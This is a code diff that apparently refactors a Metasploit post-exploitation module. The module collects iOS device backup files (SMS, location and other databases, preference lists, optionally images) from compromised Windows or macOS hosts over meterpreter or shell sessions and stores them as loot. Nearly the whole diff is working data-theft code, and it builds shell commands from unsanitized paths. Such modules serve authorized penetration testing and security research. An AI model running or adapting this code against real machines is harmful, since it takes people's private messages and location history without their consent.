@@ -1,35 +1,47 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex/parser/apple_backup_manifestdb'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Windows Gather Apple iOS MobileSync Backup File Collection',
-      'Description'    => %q{ This module will collect sensitive files from any on-disk iOS device backups },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Apple iOS MobileSync Backup File Collection',
+        'Description' => %q{ This module will collect sensitive files from any on-disk iOS device backups },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'hdm',
           'bannedit' # Based on bannedit's pidgin_cred module structure
         ],
-      'Platform'       => %w{ osx win },
-      'SessionTypes'   => ['meterpreter', 'shell']
-    ))
+        'Platform' => %w{osx win},
+        'SessionTypes' => ['meterpreter', 'shell'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_channel_eof
+              core_channel_open
+              core_channel_read
+              core_channel_write
+              stdapi_sys_config_getenv
+              stdapi_sys_config_getuid
+              stdapi_sys_config_sysinfo
+            ]
+          }
+        }
+      )
+    )
     register_options(
       [
-        OptBool.new('DATABASES',  [false, 'Collect all database files? (SMS, Location, etc)', true]),
+        OptBool.new('DATABASES', [false, 'Collect all database files? (SMS, Location, etc)', true]),
         OptBool.new('PLISTS', [false, 'Collect all preference list files?', true]),
         OptBool.new('IMAGES', [false, 'Collect all image files?', false]),
         OptBool.new('EVERYTHING', [false, 'Collect all stored files? (SLOW)', false])
-      ], self.class)
+      ]
+    )
   end
 
   #
@@ -38,10 +50,10 @@ class Metasploit3 < Msf::Post
   #
   def run
     case session.platform
-    when /osx/
+    when 'osx'
       @platform = :osx
       paths = enum_users_unix
-    when /win/
+    when 'windows'
       @platform = :windows
       drive = session.sys.config.getenv('SystemDrive')
       os = session.sys.config.sysinfo['OS']
@@ -109,6 +121,7 @@ class Metasploit3 < Msf::Post
       print_status("Checking for backups in #{backup_dir}")
       session.shell_command("ls #{backup_dir}").each_line do |dir|
         next if dir == "." || dir == ".."
+
         if dir =~ /^[0-9a-f]{16}/i
           print_status("Found #{backup_dir}\\#{dir}")
           dirs << ::File.join(backup_dir.chomp, dir.chomp)
@@ -125,6 +138,7 @@ class Metasploit3 < Msf::Post
       begin
         session.fs.dir.foreach(@users) do |path|
           next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/i
+
           bdir = "#{@users}\\#{path}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
           dirs = check_for_backups_win(bdir)
           dirs.each { |dir| paths << dir } if dirs
@@ -144,8 +158,8 @@ class Metasploit3 < Msf::Post
   def check_for_backups_win(bdir)
     dirs = []
     begin
-        print_status("Checking for backups in #{bdir}")
-        session.fs.dir.foreach(bdir) do |dir|
+      print_status("Checking for backups in #{bdir}")
+      session.fs.dir.foreach(bdir) do |dir|
         if dir =~ /^[0-9a-f]{16}/i
           print_status("Found #{bdir}\\#{dir}")
           dirs << "#{bdir}\\#{dir}"
@@ -158,11 +172,10 @@ class Metasploit3 < Msf::Post
   end
 
   def process_backups(paths)
-    paths.each {|path| process_backup(path) }
+    paths.each { |path| process_backup(path) }
   end
 
   def process_backup(path)
-
     print_status("Pulling data from #{path}...")
 
     mbdb_data = ""
@@ -215,24 +228,22 @@ class Metasploit3 < Msf::Post
         print_status("Downloading #{info[:domain]} #{info[:filename]}...")
 
         begin
-
-        fdata = ""
-        if session.type == "shell"
-          fdata = session.shell_command("cat #{path}/#{fname}")
-        else
-          mfd = session.fs.file.new("#{path}\\#{fname}", "rb")
-          until mfd.eof?
-            fdata << mfd.read
+          fdata = ""
+          if session.type == "shell"
+            fdata = session.shell_command("cat #{path}/#{fname}")
+          else
+            mfd = session.fs.file.new("#{path}\\#{fname}", "rb")
+            until mfd.eof?
+              fdata << mfd.read
+            end
+            mfd.close
           end
-          mfd.close
-        end
-        bname = info[:filename] || "unknown.bin"
-        rname = info[:domain].to_s + "_" + bname
-        rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '').gsub(/_+/, "_")
-        ctype = "application/octet-stream"
+          bname = info[:filename] || "unknown.bin"
+          rname = info[:domain].to_s + "_" + bname
+          rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '').gsub(/_+/, "_")
+          ctype = "application/octet-stream"
 
-        store_loot("ios.backup.data", ctype, session, fdata, rname, "iOS Backup: #{rname}")
-
+          store_loot("ios.backup.data", ctype, session, fdata, rname, "iOS Backup: #{rname}")
         rescue ::Interrupt
           raise $!
         rescue ::Exception => e
@@ -243,7 +254,6 @@ class Metasploit3 < Msf::Post
       end
     end
   end
-
 
   def got_root?
     case @platform
